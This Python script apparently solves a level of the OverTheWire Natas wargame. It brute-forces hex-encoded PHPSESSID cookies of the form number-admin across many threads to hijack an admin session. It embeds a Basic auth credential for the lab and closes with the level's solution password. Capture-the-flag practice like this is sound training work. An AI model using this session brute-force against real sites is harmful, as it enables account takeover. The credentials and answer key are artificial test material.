#!/usr/bin/env python3
import re
import requests
import concurrent.futures
import codecs
import time
x = 1
url = "http://natas19.natas.labs.overthewire.org/index.php?debug"
pattern = re.compile(r'regular user')


def end(string, x):
    global t1
    t2 = time.perf_counter()
    print(f"[*] Got the admin dude! itz => {x}")
    exit(f"[*] Took {t2-t1} seconds")


def encode_string(string):
    string = bytes(string, "utf-8")
    return codecs.encode(string, "hex").decode("utf-8")


def make_request(x):
    global url
    global pattern
    sessid = encode_string(str(x)) + encode_string("-admin")
    headers = {
        "Authorization": "Basic bmF0YXMxOTo0SXdJcmVrY3VabEE5T3NqT2tvVXR3VTZsaG9rQ1BZcw==",
        "Cookie": f"PHPSESSID={str(sessid)}"
    }
    response = requests.get(url, headers=headers)
    response = pattern.findall(response.text)
    if(len(response) < 1):
        end("[*] Got the admin dude! itz => ", x)
    return [response[0], x]


t1 = time.perf_counter()

map_list = [i for i in range(641)]
with concurrent.futures.ThreadPoolExecutor() as executor:
    results = executor.map(make_request, map_list)
    for result in results:
        print(result[0], result[1])
t2 = time.perf_counter()


"""Solution for this lab is eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF"""
